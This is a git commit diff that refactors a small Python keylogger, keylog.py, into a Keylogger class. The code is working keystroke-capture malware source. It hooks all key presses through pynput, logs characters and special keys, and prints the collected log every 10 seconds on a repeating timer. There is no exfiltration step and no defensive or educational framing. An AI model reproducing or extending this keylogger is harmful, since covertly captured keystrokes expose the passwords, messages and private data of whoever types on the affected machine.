939d55b0d1eb0339120c0a0f0be5da65ea9e0d5e
gouthamk-cryptichub <k.goutham2000@gmail.com>
2020-09-03 12:29:29 -0400

    Refactored to OOP

--- keylog.py
+++ keylog.py
@@ -2,24 +2,29 @@
 import pynput.keyboard
 import threading
 
-log = ""
-def use_keys(key):
-    global log
-    try:
-        log += str(key.char)
-    except AttributeError:
-        if key == key.space:
-            log += " "
-        else:
-            log += " [" + str(key) + "] "
-def report():
-    global log
-    print(log)
-    log = ""
-    timer = threading.Timer(10, report)
-    timer.start()
+class Keylogger:
+    def __init__(self):
+        self.log = ""
 
-key_rec = pynput.keyboard.Listener(on_press=use_keys)
-with key_rec:
-    report()
-    key_rec.join()
+    def use_keys(self, key):
+        try:
+            self.log += str(key.char)
+        except AttributeError:
+            if key == key.space:
+                self.log += " "
+            else:
+                self.log += " [" + str(key) + "] "
+    def report(self):
+        print(self.log)
+        self.log = ""
+        timer = threading.Timer(10, self.report)
+        timer.start()
+
+    def start(self):
+        key_rec = pynput.keyboard.Listener(on_press= self.use_keys)
+        with key_rec:
+            self.report()
+            key_rec.join()
+
+logger = Keylogger()
+logger.start()
